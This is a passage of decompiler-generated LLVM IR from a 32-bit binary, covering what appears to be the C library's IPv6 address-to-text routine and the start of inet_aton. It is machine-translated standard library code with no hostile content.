  br i1 %v1_805ef8c, label %dec_label_pc_805f133, label %dec_label_pc_805efac

dec_label_pc_805ef94:                             ; preds = %entry
  %v4_805ef94 = ptrtoint i8* %arg3 to i32
  store i32 %v4_805ef94, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_805efa0 = call i32 @inet_ntop4(i32 %v0_805ef7c, i32 %v0_805ef7b, i32 %v0_805ef7a)
  store i32 %v3_805efa0, i32* %eax.global-to-local, align 4
  store i32 %v3_805efa0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f140

dec_label_pc_805efac:                             ; preds = %dec_label_pc_805ef89
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_805efb1 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805efb1, i32* %eax.global-to-local, align 4
  %tmp42 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp42, i8** %stack_var_-124, align 4
  %v6_805efb6 = call i32 @__GI_memset(i8* %tmp42, i32 0, i32 32)
  store i32 %v6_805efb6, i32* %eax.global-to-local, align 4
  %v2_805efd8 = add i32 %arg2, 1
  br label %dec_label_pc_805efc2

dec_label_pc_805efc2:                             ; preds = %dec_label_pc_805efc2.dec_label_pc_805efc2_crit_edge, %dec_label_pc_805efac
  %v1_805efe5 = phi i32 [ %v15_805ef7d, %dec_label_pc_805efac ], [ %v1_805efe5.pre, %dec_label_pc_805efc2.dec_label_pc_805efc2_crit_edge ]
  %v0_805efdd69 = phi i32 [ 0, %dec_label_pc_805efac ], [ %v0_805efe9.pre, %dec_label_pc_805efc2.dec_label_pc_805efc2_crit_edge ]
  %v1_805efcb = ashr i32 %v0_805efdd69, 31
  %v2_805efcc = zext i32 %v0_805efdd69 to i64
  %v4_805efcc = zext i32 %v1_805efcb to i64
  %v5_805efcc = mul nuw i64 %v4_805efcc, 4294967296
  %v6_805efcc = or i64 %v5_805efcc, %v2_805efcc
  %v8_805efcc = sdiv i64 %v6_805efcc, 2
  %v9_805efcc = trunc i64 %v8_805efcc to i32
  store i32 %v9_805efcc, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_805efcc, i32* %ebx.global-to-local, align 4
  %v2_805efd4 = add i32 %v0_805efdd69, %arg2
  %v3_805efd4 = inttoptr i32 %v2_805efd4 to i8*
  %v4_805efd4 = load i8, i8* %v3_805efd4, align 1
  %v5_805efd4 = zext i8 %v4_805efd4 to i32
  store i32 %v5_805efd4, i32* %eax.global-to-local, align 4
  %v3_805efd8 = add i32 %v2_805efd8, %v0_805efdd69
  %v4_805efd8 = inttoptr i32 %v3_805efd8 to i8*
  %v5_805efd8 = load i8, i8* %v4_805efd8, align 1
  %v6_805efd8 = zext i8 %v5_805efd8 to i32
  store i32 %v6_805efd8, i32* %edx.global-to-local, align 4
  %v1_805efdd = add i32 %v0_805efdd69, 2
  store i32 %v1_805efdd, i32* @ecx, align 4
  %v2_805efe0 = mul nuw nsw i32 %v5_805efd4, 256
  %v2_805efe3 = or i32 %v6_805efd8, %v2_805efe0
  store i32 %v2_805efe3, i32* %eax.global-to-local, align 4
  %v3_805efe5 = mul i32 %v9_805efcc, 4
  %v4_805efe5 = add i32 %v3_805efe5, 60
  %v5_805efe5 = add i32 %v4_805efe5, %v1_805efe5
  %v6_805efe5 = inttoptr i32 %v5_805efe5 to i32*
  store i32 %v2_805efe3, i32* %v6_805efe5, align 4
  %v0_805efe9.pre = load i32, i32* @ecx, align 4
  %v7_805efec = icmp sgt i32 %v0_805efe9.pre, 15
  br i1 %v7_805efec, label %dec_label_pc_805efee, label %dec_label_pc_805efc2.dec_label_pc_805efc2_crit_edge

dec_label_pc_805efc2.dec_label_pc_805efc2_crit_edge: ; preds = %dec_label_pc_805efc2
  %v1_805efe5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805efc2

dec_label_pc_805efee:                             ; preds = %dec_label_pc_805efc2
  %v4_805efac = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805eff8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805eff8

dec_label_pc_805eff8:                             ; preds = %dec_label_pc_805efee, %dec_label_pc_805f025
  %v0_805f02568 = phi i32 [ 0, %dec_label_pc_805efee ], [ %v1_805f025, %dec_label_pc_805f025 ]
  %v0_805f01067 = phi i32 [ -1, %dec_label_pc_805efee ], [ %v0_805f0107, %dec_label_pc_805f025 ]
  %v0_805f03066 = phi i32 [ -1, %dec_label_pc_805efee ], [ %v0_805f0158, %dec_label_pc_805f025 ]
  %v0_805f03b65 = phi i32 [ -1, %dec_label_pc_805efee ], [ %v0_805f02012, %dec_label_pc_805f025 ]
  %v2_805eff8 = mul nuw nsw i32 %v0_805f02568, 4
  %v3_805eff8 = add nuw nsw i32 %v2_805eff8, 60
  %v4_805eff8 = add i32 %v3_805eff8, %v0_805eff8.pre
  %v5_805eff8 = inttoptr i32 %v4_805eff8 to i32*
  %v6_805eff8 = load i32, i32* %v5_805eff8, align 4
  %v7_805eff8 = icmp eq i32 %v6_805eff8, 0
  %v1_805effd = icmp eq i1 %v7_805eff8, false
  %v10_805f010 = icmp eq i32 %v0_805f01067, -1
  br i1 %v1_805effd, label %dec_label_pc_805f010, label %dec_label_pc_805efff

dec_label_pc_805efff:                             ; preds = %dec_label_pc_805eff8
  %v1_805f002 = icmp eq i1 %v10_805f010, false
  br i1 %v1_805f002, label %dec_label_pc_805f00d, label %dec_label_pc_805f004

dec_label_pc_805f004:                             ; preds = %dec_label_pc_805efff
  store i32 %v0_805f02568, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805f025

dec_label_pc_805f00d:                             ; preds = %dec_label_pc_805efff
  %v0_805f00d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805f00d = add i32 %v0_805f00d, 1
  store i32 %v1_805f00d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805f025

dec_label_pc_805f010:                             ; preds = %dec_label_pc_805eff8
  br i1 %v10_805f010, label %dec_label_pc_805f025, label %dec_label_pc_805f015

dec_label_pc_805f015:                             ; preds = %dec_label_pc_805f010
  %v10_805f015 = icmp eq i32 %v0_805f03066, -1
  %v0_805f01e.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805f01a = load i32, i32* @ebp, align 4
  %v7_805f01c = icmp sgt i32 %v0_805f01e.pre, %v1_805f01a
  %or.cond = or i1 %v10_805f015, %v7_805f01c
  br i1 %or.cond, label %dec_label_pc_805f01e, label %dec_label_pc_805f022

dec_label_pc_805f01e:                             ; preds = %dec_label_pc_805f015
  store i32 %v0_805f01e.pre, i32* @ebp, align 4
  store i32 %v0_805f03b65, i32* @edi, align 4
  br label %dec_label_pc_805f022

dec_label_pc_805f022:                             ; preds = %dec_label_pc_805f015, %dec_label_pc_805f01e
  %v0_805f01510 = phi i32 [ %v0_805f03b65, %dec_label_pc_805f01e ], [ %v0_805f03066, %dec_label_pc_805f015 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f025

dec_label_pc_805f025:                             ; preds = %dec_label_pc_805f010, %dec_label_pc_805f00d, %dec_label_pc_805f004, %dec_label_pc_805f022
  %v0_805f02012 = phi i32 [ %v0_805f03b65, %dec_label_pc_805f010 ], [ %v0_805f03b65, %dec_label_pc_805f00d ], [ %v0_805f02568, %dec_label_pc_805f004 ], [ -1, %dec_label_pc_805f022 ]
  %v0_805f0107 = phi i32 [ -1, %dec_label_pc_805f010 ], [ %v0_805f01067, %dec_label_pc_805f00d ], [ %v0_805f02568, %dec_label_pc_805f004 ], [ -1, %dec_label_pc_805f022 ]
  %v0_805f0158 = phi i32 [ %v0_805f03066, %dec_label_pc_805f010 ], [ %v0_805f03066, %dec_label_pc_805f00d ], [ %v0_805f03066, %dec_label_pc_805f004 ], [ %v0_805f01510, %dec_label_pc_805f022 ]
  %v1_805f025 = add nuw nsw i32 %v0_805f02568, 1
  store i32 %v1_805f025, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_805f025, 8
  br i1 %exitcond, label %dec_label_pc_805f02b, label %dec_label_pc_805eff8

dec_label_pc_805f02b:                             ; preds = %dec_label_pc_805f025
  %v10_805f02b = icmp eq i32 %v0_805f02012, -1
  br i1 %v10_805f02b, label %dec_label_pc_805f03d, label %dec_label_pc_805f030

dec_label_pc_805f030:                             ; preds = %dec_label_pc_805f02b
  %v10_805f030 = icmp eq i32 %v0_805f0158, -1
  %v0_805f039.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_805f030, label %dec_label_pc_805f039, label %dec_label_pc_805f035

dec_label_pc_805f035:                             ; preds = %dec_label_pc_805f030
  %v1_805f035 = load i32, i32* @ebp, align 4
  %v7_805f037 = icmp sgt i32 %v0_805f039.pre, %v1_805f035
  br i1 %v7_805f037, label %dec_label_pc_805f039, label %dec_label_pc_805f03d

dec_label_pc_805f039:                             ; preds = %dec_label_pc_805f030, %dec_label_pc_805f035
  store i32 %v0_805f039.pre, i32* @ebp, align 4
  store i32 %v0_805f02012, i32* @edi, align 4
  br label %dec_label_pc_805f03d

dec_label_pc_805f03d:                             ; preds = %dec_label_pc_805f035, %dec_label_pc_805f02b, %dec_label_pc_805f039
  %v5_805f04a = phi i32 [ %v0_805f0158, %dec_label_pc_805f035 ], [ %v0_805f0158, %dec_label_pc_805f02b ], [ %v0_805f02012, %dec_label_pc_805f039 ]
  %v10_805f03d = icmp eq i32 %v5_805f04a, -1
  br i1 %v10_805f03d, label %dec_label_pc_805f04d, label %dec_label_pc_805f042

dec_label_pc_805f042:                             ; preds = %dec_label_pc_805f03d
  %v0_805f042 = load i32, i32* @ebp, align 4
  %v1_805f042 = add i32 %v0_805f042, -1
  %v6_805f042 = sub i32 0, %v0_805f042
  %v7_805f042 = and i32 %v0_805f042, %v6_805f042
  %v8_805f042 = icmp slt i32 %v7_805f042, 0
  %v9_805f042 = icmp eq i32 %v1_805f042, 0
  %v10_805f042 = icmp slt i32 %v1_805f042, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_805f04a = icmp ne i1 %v10_805f042, %v8_805f042
  %v4_805f04a = or i1 %v9_805f042, %v3_805f04a
  %v7_805f04a = select i1 %v4_805f04a, i32 -1, i32 %v5_805f04a
  store i32 %v7_805f04a, i32* @edi, align 4
  br label %dec_label_pc_805f04d

dec_label_pc_805f04d:                             ; preds = %dec_label_pc_805f03d, %dec_label_pc_805f042
  %v0_805f0ed17 = phi i32 [ %v5_805f04a, %dec_label_pc_805f03d ], [ %v7_805f04a, %dec_label_pc_805f042 ]
  %v2_805f04d = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_805f04d, i32* @ebx, align 4
  %v3_805f0cf = add i32 %v4_805efac, 64
  %v12_805f08d = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805f0ed57 = icmp eq i32 %v0_805f0ed17, -1
  %v1_805f095 = icmp eq i1 %v12_805f08d, false
  br label %dec_label_pc_805f058

dec_label_pc_805f058:                             ; preds = %dec_label_pc_805f04d, %dec_label_pc_805f0e3
  %v10_805f0ed64 = phi i1 [ %v10_805f0ed57, %dec_label_pc_805f04d ], [ %v10_805f0ed, %dec_label_pc_805f0e3 ]
  %v0_805f07263 = phi i32 [ 0, %dec_label_pc_805f04d ], [ %v1_805f0e3, %dec_label_pc_805f0e3 ]
  %v1_805f06862 = phi i32 [ %v0_805f0ed17, %dec_label_pc_805f04d ], [ %v0_805f0ed.pre, %dec_label_pc_805f0e3 ]
  %v0_805f07661 = phi i32 [ %v2_805f04d, %dec_label_pc_805f04d ], [ %v0_805f06c18, %dec_label_pc_805f0e3 ]
  %stack_var_-120.160 = phi i8* [ null, %dec_label_pc_805f04d ], [ %stack_var_-120.0, %dec_label_pc_805f0e3 ]
  %stack_var_-116.159 = phi i32 [ 32, %dec_label_pc_805f04d ], [ %stack_var_-116.0, %dec_label_pc_805f0e3 ]
  br i1 %v10_805f0ed64, label %dec_label_pc_805f072, label %dec_label_pc_805f05d

dec_label_pc_805f05d:                             ; preds = %dec_label_pc_805f058
  %v2_805f05d = sub i32 %v0_805f07263, %v1_805f06862
  %v8_805f05d = xor i32 %v0_805f07263, %v1_805f06862
  %v9_805f05d = xor i32 %v2_805f05d, %v0_805f07263
  %v10_805f05d = and i32 %v9_805f05d, %v8_805f05d
  %v11_805f05d = icmp slt i32 %v10_805f05d, 0
  %v12_805f05d = icmp eq i32 %v2_805f05d, 0
  %v13_805f05d = icmp slt i32 %v2_805f05d, 0
  %v2_805f05f = icmp eq i1 %v13_805f05d, %v11_805f05d
  br i1 %v2_805f05f, label %dec_label_pc_805f061, label %dec_label_pc_805f072

dec_label_pc_805f061:                             ; preds = %dec_label_pc_805f05d
  %v1_805f061 = load i32, i32* @ebp, align 4
  %v2_805f061 = add i32 %v1_805f061, %v1_805f06862
  store i32 %v2_805f061, i32* %eax.global-to-local, align 4
  %v2_805f064 = sub i32 %v0_805f07263, %v2_805f061
  %v8_805f064 = xor i32 %v2_805f061, %v0_805f07263
  %v9_805f064 = xor i32 %v2_805f064, %v0_805f07263
  %v10_805f064 = and i32 %v9_805f064, %v8_805f064
  %v11_805f064 = icmp slt i32 %v10_805f064, 0
  %v13_805f064 = icmp slt i32 %v2_805f064, 0
  %v2_805f066 = icmp eq i1 %v13_805f064, %v11_805f064
  br i1 %v2_805f066, label %dec_label_pc_805f072, label %dec_label_pc_805f068

dec_label_pc_805f068:                             ; preds = %dec_label_pc_805f061
  %v1_805f06a = icmp eq i1 %v12_805f05d, false
  br i1 %v1_805f06a, label %dec_label_pc_805f0e3, label %dec_label_pc_805f06c

dec_label_pc_805f06c:                             ; preds = %dec_label_pc_805f068
  %v1_805f06c = inttoptr i32 %v0_805f07661 to i8*
  store i8 58, i8* %v1_805f06c, align 1
  %v0_805f06f = load i32, i32* @ebx, align 4
  %v1_805f06f = add i32 %v0_805f06f, 1
  store i32 %v1_805f06f, i32* @ebx, align 4
  br label %dec_label_pc_805f0e3

dec_label_pc_805f072:                             ; preds = %dec_label_pc_805f05d, %dec_label_pc_805f061, %dec_label_pc_805f058
  %v1_805f072 = icmp eq i32 %v0_805f07263, 0
  br i1 %v1_805f072, label %dec_label_pc_805f07a, label %dec_label_pc_805f076

dec_label_pc_805f076:                             ; preds = %dec_label_pc_805f072
  %v1_805f076 = inttoptr i32 %v0_805f07661 to i8*
  store i8 58, i8* %v1_805f076, align 1
  %v0_805f079 = load i32, i32* @ebx, align 4
  %v1_805f079 = add i32 %v0_805f079, 1
  store i32 %v1_805f079, i32* @ebx, align 4
  %v0_805f07a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805f07a

dec_label_pc_805f07a:                             ; preds = %dec_label_pc_805f072, %dec_label_pc_805f076
  %v0_805f0d8 = phi i32 [ %v0_805f07661, %dec_label_pc_805f072 ], [ %v1_805f079, %dec_label_pc_805f076 ]
  %v1_805f0cf = phi i32 [ 0, %dec_label_pc_805f072 ], [ %v0_805f07a.pre, %dec_label_pc_805f076 ]
  %v9_805f07a = icmp eq i32 %v1_805f0cf, 6
  %v1_805f07d = icmp eq i1 %v9_805f07a, false
  br i1 %v1_805f07d, label %dec_label_pc_805f0ce, label %dec_label_pc_805f07f

dec_label_pc_805f07f:                             ; preds = %dec_label_pc_805f07a
  %v0_805f07f = load i32, i32* @edi, align 4
  %v1_805f07f = icmp eq i32 %v0_805f07f, 0
  %v1_805f081 = icmp eq i1 %v1_805f07f, false
  br i1 %v1_805f081, label %dec_label_pc_805f0ce, label %dec_label_pc_805f083

dec_label_pc_805f083:                             ; preds = %dec_label_pc_805f07f
  %v0_805f083 = load i32, i32* @ebp, align 4
  %v9_805f083 = icmp eq i32 %v0_805f083, 6
  br i1 %v9_805f083, label %dec_label_pc_805f097, label %dec_label_pc_805f088

dec_label_pc_805f088:                             ; preds = %dec_label_pc_805f083
  %v9_805f088 = icmp eq i32 %v0_805f083, 5
  %v1_805f08b = icmp eq i1 %v9_805f088, false
  br i1 %v1_805f08b, label %dec_label_pc_805f0ce, label %dec_label_pc_805f08d

dec_label_pc_805f08d:                             ; preds = %dec_label_pc_805f088
  br i1 %v1_805f095, label %dec_label_pc_805f0ce, label %dec_label_pc_805f097

dec_label_pc_805f097:                             ; preds = %dec_label_pc_805f08d, %dec_label_pc_805f083
  %v2_805f09d = sub i32 %v0_805f0d8, %v2_805f04d
  store i32 %v2_805f09d, i32* @esi, align 4
  %v2_805f0a8 = sub i32 46, %v2_805f09d
  store i32 %v2_805f0a8, i32* @ecx, align 4
  store i32 %v0_805f0d8, i32* @edx, align 4
  %v1_805f0ac = add i32 %arg2, 12
  store i32 %v1_805f0ac, i32* @eax, align 4
  %v0_805f0af = load i8*, i8** %stack_var_-124, align 4
  %v1_805f0af = ptrtoint i8* %v0_805f0af to i32
  %v3_805f0af = ptrtoint i8* %stack_var_-120.160 to i32
  %v5_805f0af = call i32 @inet_ntop4(i32 %v1_805f0af, i32 %v3_805f0af, i32 %stack_var_-116.159)
  store i32 %v5_805f0af, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805f0b6 = icmp eq i32 %v5_805f0af, 0
  br i1 %v1_805f0b6, label %dec_label_pc_805f140, label %dec_label_pc_805f0be

dec_label_pc_805f0be:                             ; preds = %dec_label_pc_805f097
  %v0_805f0c1 = load i32, i32* @ebx, align 4
  %v5_805f0c1 = inttoptr i32 %v0_805f0c1 to i8*
  store i8* %v5_805f0c1, i8** %stack_var_-124, align 4
  %v3_805f0c2 = call i32 @strlen(i8* %v5_805f0c1)
  store i32 %v3_805f0c2, i32* %eax.global-to-local, align 4
  %v0_805f0ca = load i32, i32* @ebx, align 4
  %v3_805f0ca = add i32 %v0_805f0ca, %v3_805f0c2
  store i32 %v3_805f0ca, i32* @ebx, align 4
  %v0_805f0f2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805f0f2

dec_label_pc_805f0ce:                             ; preds = %dec_label_pc_805f08d, %dec_label_pc_805f088, %dec_label_pc_805f07f, %dec_label_pc_805f07a
  %v0_805f0ce = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805f0ce, i32* %stack_var_-112, align 4
  %v2_805f0cf = mul i32 %v1_805f0cf, 4
  %v4_805f0cf = add i32 %v3_805f0cf, %v2_805f0cf
  %v5_805f0cf = inttoptr i32 %v4_805f0cf to i32*
  %v6_805f0cf = load i32, i32* %v5_805f0cf, align 4
  %v5_805f0d8 = inttoptr i32 %v0_805f0d8 to i8*
  store i8* %v5_805f0d8, i8** %stack_var_-124, align 4
  %v4_805f0d9 = call i32 @sprintf(i32 %v0_805f0d8, i32 ptrtoint ([3 x i8]* @global_var_806e554.670 to i32))
  store i32 %v4_805f0d9, i32* %eax.global-to-local, align 4
  %v0_805f0e1 = load i32, i32* @ebx, align 4
  %v2_805f0e1 = add i32 %v0_805f0e1, %v4_805f0d9
  store i32 %v2_805f0e1, i32* @ebx, align 4
  br label %dec_label_pc_805f0e3

dec_label_pc_805f0e3:                             ; preds = %dec_label_pc_805f068, %dec_label_pc_805f06c, %dec_label_pc_805f0ce
  %stack_var_-116.0 = phi i32 [ %v6_805f0cf, %dec_label_pc_805f0ce ], [ %stack_var_-116.159, %dec_label_pc_805f068 ], [ %stack_var_-116.159, %dec_label_pc_805f06c ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806e554.670, i32 0, i32 0), %dec_label_pc_805f0ce ], [ %stack_var_-120.160, %dec_label_pc_805f068 ], [ %stack_var_-120.160, %dec_label_pc_805f06c ]
  %v0_805f06c18 = phi i32 [ %v2_805f0e1, %dec_label_pc_805f0ce ], [ %v0_805f07661, %dec_label_pc_805f068 ], [ %v1_805f06f, %dec_label_pc_805f06c ]
  %v0_805f0e3 = load i32, i32* @esi, align 4
  %v1_805f0e3 = add i32 %v0_805f0e3, 1
  %v0_805f0ed.pre = load i32, i32* @edi, align 4
  store i32 %v1_805f0e3, i32* @esi, align 4
  %v7_805f0e7 = icmp sgt i32 %v1_805f0e3, 7
  %v10_805f0ed = icmp eq i32 %v0_805f0ed.pre, -1
  br i1 %v7_805f0e7, label %dec_label_pc_805f0ed, label %dec_label_pc_805f058

dec_label_pc_805f0ed:                             ; preds = %dec_label_pc_805f0e3
  br i1 %v10_805f0ed, label %dec_label_pc_805f0fe, label %dec_label_pc_805f0f2

dec_label_pc_805f0f2:                             ; preds = %dec_label_pc_805f0ed, %dec_label_pc_805f0be
  %v0_805f0fa = phi i32 [ %v0_805f06c18, %dec_label_pc_805f0ed ], [ %v3_805f0ca, %dec_label_pc_805f0be ]
  %v0_805f0f2 = phi i32 [ %v0_805f0ed.pre, %dec_label_pc_805f0ed ], [ %v0_805f0f2.pre, %dec_label_pc_805f0be ]
  %v1_805f0f2 = load i32, i32* @ebp, align 4
  %v2_805f0f2 = add i32 %v1_805f0f2, %v0_805f0f2
  store i32 %v2_805f0f2, i32* %eax.global-to-local, align 4
  %v9_805f0f5 = icmp eq i32 %v2_805f0f2, 8
  %v1_805f0f8 = icmp eq i1 %v9_805f0f5, false
  br i1 %v1_805f0f8, label %dec_label_pc_805f0fe, label %dec_label_pc_805f0fa

dec_label_pc_805f0fa:                             ; preds = %dec_label_pc_805f0f2
  %v1_805f0fa = inttoptr i32 %v0_805f0fa to i8*
  store i8 58, i8* %v1_805f0fa, align 1
  %v0_805f0fd = load i32, i32* @ebx, align 4
  %v1_805f0fd = add i32 %v0_805f0fd, 1
  store i32 %v1_805f0fd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805f0fe

dec_label_pc_805f0fe:                             ; preds = %dec_label_pc_805f0f2, %dec_label_pc_805f0ed, %dec_label_pc_805f0fa
  %v0_805f102 = phi i32 [ %v0_805f0fa, %dec_label_pc_805f0f2 ], [ %v0_805f06c18, %dec_label_pc_805f0ed ], [ %v1_805f0fd, %dec_label_pc_805f0fa ]
  store i32 %v2_805f04d, i32* %edx.global-to-local, align 4
  %v1_805f102 = add i32 %v0_805f102, 1
  store i32 %v1_805f102, i32* %eax.global-to-local, align 4
  %v1_805f105 = inttoptr i32 %v0_805f102 to i8*
  store i8 0, i8* %v1_805f105, align 1
  %v0_805f108 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f108 = load i32, i32* %edx.global-to-local, align 4
  %v2_805f108 = sub i32 %v0_805f108, %v1_805f108
  store i32 %v2_805f108, i32* @eax, align 4
  %tmp74 = icmp ugt i32 %v2_805f108, %arg4
  br i1 %tmp74, label %dec_label_pc_805f110, label %dec_label_pc_805f11d

dec_label_pc_805f110:                             ; preds = %dec_label_pc_805f0fe
  %v0_805f110 = load i8*, i8** %stack_var_-124, align 4
  %v1_805f110 = ptrtoint i8* %v0_805f110 to i32
  %v2_805f110 = call i32 @__errno_location(i32 %v1_805f110)
  store i32 %v2_805f110, i32* %eax.global-to-local, align 4
  %v1_805f115 = inttoptr i32 %v2_805f110 to i32*
  store i32 28, i32* %v1_805f115, align 4
  br label %dec_label_pc_805f13e

dec_label_pc_805f11d:                             ; preds = %dec_label_pc_805f0fe
  %v0_805f11d = load i32, i32* @edi, align 4
  store i32 %v0_805f11d, i32* %stack_var_-112, align 4
  %tmp44 = bitcast i8** %stack_var_12 to i32*
  %v3_805f1201 = load i32, i32* %tmp44, align 4
  %tmp45 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_805f1201, i32* %tmp45, align 4
  %v0_805f127.cast = inttoptr i32 %v3_805f1201 to i8*
  %v5_805f127 = call i32 @strcpy(i8* %v0_805f127.cast, i32 %v2_805f04d)
  store i32 %v5_805f127, i32* %eax.global-to-local, align 4
  store i32 %v5_805f127, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f140

dec_label_pc_805f133:                             ; preds = %dec_label_pc_805ef89
  %v1_805f133 = call i32 @__errno_location(i32 %v0_805ef7c)
  store i32 %v1_805f133, i32* %eax.global-to-local, align 4
  %v1_805f138 = inttoptr i32 %v1_805f133 to i32*
  store i32 97, i32* %v1_805f138, align 4
  br label %dec_label_pc_805f13e

dec_label_pc_805f13e:                             ; preds = %dec_label_pc_805f110, %dec_label_pc_805f133
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805f140

dec_label_pc_805f140:                             ; preds = %dec_label_pc_805f097, %dec_label_pc_805f11d, %dec_label_pc_805ef94, %dec_label_pc_805f13e
  %v0_805f143 = phi i32 [ 0, %dec_label_pc_805f097 ], [ %v5_805f127, %dec_label_pc_805f11d ], [ %v3_805efa0, %dec_label_pc_805ef94 ], [ 0, %dec_label_pc_805f13e ]
  store i32 %v0_805f143, i32* %eax.global-to-local, align 4
  store i32 %v0_805ef7c, i32* @ebx, align 4
  store i32 %v0_805ef7b, i32* @esi, align 4
  store i32 %v0_805ef7a, i32* @edi, align 4
  store i32 %v0_805ef79, i32* @ebp, align 4
  ret i32 %v0_805f143

; uselistorder directives
  uselistorder i32 %v0_805f143, { 1, 0 }
  uselistorder i32 %v0_805f102, { 1, 0 }
  uselistorder i1 %v10_805f0ed, { 1, 0 }
  uselistorder i32 %v0_805f0ed.pre, { 1, 0, 2 }
  uselistorder i32 %v1_805f0e3, { 1, 0, 2 }
  uselistorder i32 %v1_805f0cf, { 1, 0 }
  uselistorder i32 %v0_805f0d8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_805f064, { 1, 0 }
  uselistorder i32 %v2_805f05d, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.159, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.160, { 2, 1, 0 }
  uselistorder i32 %v0_805f07661, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805f06862, { 2, 1, 0 }
  uselistorder i32 %v0_805f07263, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_805f04d, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805f0ed17, { 1, 0 }
  uselistorder i32 %v1_805f042, { 1, 0 }
  uselistorder i32 %v0_805f042, { 1, 0, 2 }
  uselistorder i32 %v5_805f04a, { 1, 2, 0 }
  uselistorder i32 %v1_805f025, { 0, 2, 1 }
  uselistorder i32 %v0_805f0158, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805f02012, { 1, 2, 0, 3 }
  uselistorder i1 %v10_805f010, { 1, 0 }
  uselistorder i32 %v0_805f03b65, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805f03066, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805f02568, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805efdd69, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_805ef7c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 4, 5, 1, 3, 2, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder [3 x i8]* @global_var_806e554.670, { 1, 0 }
  uselistorder i8 58, { 6, 7, 8, 0, 1, 2, 3, 4, 9, 5 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805f140, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_805f13e, { 1, 0 }
  uselistorder label %dec_label_pc_805f0fe, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805f0e3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f07a, { 1, 0 }
  uselistorder label %dec_label_pc_805f072, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805f058, { 1, 0 }
  uselistorder label %dec_label_pc_805f04d, { 1, 0 }
  uselistorder label %dec_label_pc_805f03d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805f039, { 1, 0 }
  uselistorder label %dec_label_pc_805f025, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805f022, { 1, 0 }
  uselistorder label %dec_label_pc_805eff8, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805f153 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805f153, i32* @ecx, align 4
  %v1_805f157 = icmp eq i8* %arg1, null
  br i1 %v1_805f157, label %dec_label_pc_805f1d8, label %dec_label_pc_805f15b

dec_label_pc_805f15b:                             ; preds = %entry
  %v0_805f166.pre = load i32, i32* @global_var_8075640, align 64
  br label %dec_label_pc_805f166

dec_label_pc_805f166:                             ; preds = %dec_label_pc_805f15b, %dec_label_pc_805f1af
  %v2_805f1af34 = phi i32 [ 1, %dec_label_pc_805f15b ], [ %v3_805f1af, %dec_label_pc_805f1af ]
  %v0_805f16c33 = phi i32 [ %v4_805f153, %dec_label_pc_805f15b ], [ %v0_805f16c3, %dec_label_pc_805f1af ]
  %v0_805f1cd32 = phi i32 [ 0, %dec_label_pc_805f15b ], [ %v2_805f1b5, %dec_label_pc_805f1af ]
  %v1_805f16c = inttoptr i32 %v0_805f16c33 to i8*
  %v2_805f16c = load i8, i8* %v1_805f16c, align 1
  %v3_805f16c = sext i8 %v2_805f16c to i32
  %v2_805f16f = mul nsw i32 %v3_805f16c, 2
  %v3_805f16f = add i32 %v2_805f16f, %v0_805f166.pre
